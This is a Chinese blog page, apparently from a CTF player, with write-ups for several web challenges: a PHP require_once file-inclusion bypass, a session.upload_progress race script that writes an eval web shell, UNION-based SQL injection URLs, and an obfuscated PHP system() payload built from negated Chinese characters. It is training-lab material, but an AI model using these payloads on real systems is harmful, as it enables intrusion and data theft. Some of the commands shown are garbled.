&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;require_once&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;flag.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;require_once&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;题解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#题解&#34;&gt;#&lt;/a&gt; 题解&lt;/h2&gt;
&lt;p&gt;绕过不能重复包含文件的限制&lt;/p&gt;
&lt;h3 id=&#34;解法1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解法1&#34;&gt;#&lt;/a&gt; 解法 1&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;PHP 最新版的小 Trick,require_once 包含的软链接层数较多时 once 的 hash 匹配会直接失效造成重复包含&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/proc/[pid]`记录了系统运行的信息状态，而`/proc/self`指的是当前进程(自身进程)的pid，就类似于类里面的`this
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;/proc/self/root/&lt;/code&gt;  是指向 &lt;code&gt;/&lt;/code&gt;  的符号链接&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;?file=php://filter/convert.base64-.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;另一种写法&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;/proc/self/cwd/&lt;/code&gt;  指向当前进程运行目录的一个符号链接，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;复制成功&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;?file=php://filter/read=convert.base64-encode/index/resource=/123/../../proc/self/cwd/flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;解法2-条件竞争利用sessionupload_progress&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解法2-条件竞争利用sessionupload_progress&#34;&gt;#&lt;/a&gt; 解法 2 条件竞争：利用 session.upload_progress&lt;/h3&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; io&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; threading&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;host &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;http://f1f8290e-450c-47c9-8dfd-b1bb5f4a2807.node4.buuoj.cn:81/&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sessid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;flag&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;session&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        f &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;BytesIO&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1024&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        session&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token string&#34;&gt;&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&amp;lt;?php $shell=&#39;&amp;lt;?php @eval($_POST[cmd])?&gt;&#39;;system(&#39;ls /&#39;);fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),$shell);file_put_contents(&#39;shell.php&#39;,$shell);echo md5(&#39;1&#39;);?&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            files&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            cookies&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;PHPSESSID&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; sessid&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;session&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; session&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#39;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;?file=/tmp/sess_&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;sessid&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# 1 的 MD5 值&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;c4ca4238a0b923820dcc509a6f75849b&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;[+++]retry&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;session&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; session&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    t1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; threading&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Thread&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;target&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; args&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;session&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    t1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;daemon &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 主线程退出时，不管子线程是否完成都随主线程退出&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    t1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;start&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;session&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;试了下文件写入不了，不知道为啥，&lt;/p&gt;
&lt;h4 id=&#34;只能直接读&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#只能直接读&#34;&gt;#&lt;/a&gt; 只能直接读&lt;/h4&gt;
&lt;p&gt;（临时文件，会被删掉。）&lt;/p&gt;
&lt;p&gt;参考：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zeXVuYWh0LmNvbS9wLzIzMzk3MTgwNzQuaHRtbA==&#34;&gt;https://syunaht.com/p/2339718074.html&lt;/span&gt;&lt;/p&gt;

 &lt;p&gt;&lt;img data-src=&#34;../images/%5Bb01lers2020%5DLifeOnMars/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;进来是这样的场景：用 f12 进入网络发现有些一样的传参：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5Bb01lers2020%5DLifeOnMars/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现有个 search 的传参：（结合源码（ctrl+u）发现有个 life on mars 这个文件）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;life on mars.js

function get_life(query) &amp;#123;
  $.ajax(&amp;#123;
    type: &amp;quot;GET&amp;quot;,
    url: &amp;quot;/query?search=&amp;quot; + query,
    data: &amp;quot;&amp;#123;&amp;#125;&amp;quot;,
    contentType: &amp;quot;application/json; charset=utf-8&amp;quot;,
    dataType: &amp;quot;json&amp;quot;,
    cache: false,
    success: function(data) &amp;#123;
      var table_html =
        &#39;&amp;lt;table id=&amp;quot;results&amp;quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Name&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Description&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;&#39;;
      $.each(data, function(i, item) &amp;#123;
        table_html +=
          &amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;quot; + data[i][0] + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;quot; + data[i][1] + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;
      &amp;#125;);
      table_html += &amp;quot;&amp;lt;/table&amp;gt;&amp;quot;;

      $(&amp;quot;#results&amp;quot;).replaceWith(table_html);
    &amp;#125;,

    error: function(msg) &amp;#123; &amp;#125;
  &amp;#125;);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;该 js 文件返回的是数据集，那么这里一定查询了数据库，那么就可能存在&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1zcWwlRTYlQjMlQTglRTUlODUlQTUlRTYlQkMlOEYlRTYlQjQlOUUmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt; sql 注入漏洞&lt;/span&gt;。那就开始 sql 注入的流程。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/query?search=&lt;/code&gt;  如果地名输入正确，发现返回如下:&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5Bb01lers2020%5DLifeOnMars/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;开始 SQL 注入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;有几个字段：http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum order by 2
查询数据库名称：http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum union select 1,database()
查询数据表：http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum union select 1,(SELECT%20group_concat(table_name)%20FROM%20information_schema.tables%20%20WHERE%20table_schema%20=%20%27aliens%27)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;到这里就搞不出来了：然后就是&lt;/p&gt;
&lt;h4 id=&#34;查询所有的数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查询所有的数据库&#34;&gt;#&lt;/a&gt; 查询所有的数据库&lt;/h4&gt;
&lt;p&gt;在这个查询中，information_schema.schemata 是一个 MySQL 系统表，其中包含所有数据库的信息。执行这个查询后，MySQL 将返回一个包含所有数据库名称的结果集。&lt;/p&gt;
&lt;p&gt;这些命令和查询可以在 MySQL 命令行界面中使用，也可以在 MySQL 客户端或其他数据库工具中使用。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEwMWE0OThjLWNlNGEtNDM2NC05Nzk5LWQ5YmRiMTkxMmY0My5ub2RlNS5idXVvai5jbjo4MS9xdWVyeT9zZWFyY2g9aGVzcGVyaWFfcGxhbnVtJTIwdW5pb24lMjBzZWxlY3QlMjAxLChTRUxFQ1QlMjBncm91cF9jb25jYXQoc2NoZW1hX25hbWUpJTIwRlJPTSUyMGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YQ==&#34;&gt;http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum union select 1,(SELECT group_concat(schema_name) FROM information_schema.schemata&lt;/span&gt;)&lt;/p&gt;
&lt;p&gt;还可以：（直接用 sqlmap）：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5Bb01lers2020%5DLifeOnMars/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;爆出还有一个 alien_code 这个库：（重复上个的操作）&lt;/p&gt;
&lt;p&gt;或者可以：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5Bb01lers2020%5DLifeOnMars/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接有字段名了：&lt;/p&gt;
&lt;p&gt;没有直接给出就手打：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=amazonis_planitia%20union%20select%20group_concat(id),group_concat(code)%20from%20alien_code.code
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;完成，获得 flag&lt;/p&gt;

 &lt;h2 id=&#34;suctf2018getshell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suctf2018getshell&#34;&gt;#&lt;/a&gt; [suctf2018]GetShell&lt;/h2&gt;
&lt;p&gt;参考 p 神利用取反来获取可用字符：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);
$a = ~垂;
echo $a.&amp;quot;\n&amp;quot;;
echo $a[1];
/*
运行得：
a&amp;#125;
a
*/
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;🐎一下汉字：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo ~茉**[**$____**]**;//s

echo ~内**[**$____**]**;//y

echo ~茉**[**$____**]**;//s

echo ~苏**[**$____**]**;//t

echo ~的**[**$____**]**;//e

echo ~咩**[**$____**]**;//m

echo ~课**[**$____**]**;//P

echo ~尬**[**$____**]**;//O

echo ~笔**[**$____**]**;//S

echo ~端**[**$____**]**;//T

echo ~瞎**[**$____**]**;//a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;构成🐎，POST 参数 a：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?=$_=[];$__.=$_;$____=$_==$_;$___=~茉[$____];$___.=~内[$____];$___.=~茉[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;![1](…/images/[SUCTF 2018]GetShell/1.png)&lt;/p&gt;
&lt;h4 id=&#34;用env访问环境变量获得flag&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用env访问环境变量获得flag&#34;&gt;#&lt;/a&gt; 用 env 访问环境变量获得 flag：&lt;/h4&gt;
&lt;p&gt;参考自：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2hhd3Jvb3QuY2MvMTg1Ni5odG1s&#34;&gt;https://www.shawroot.cc/1856.html&lt;/span&gt;&lt;/p&gt;

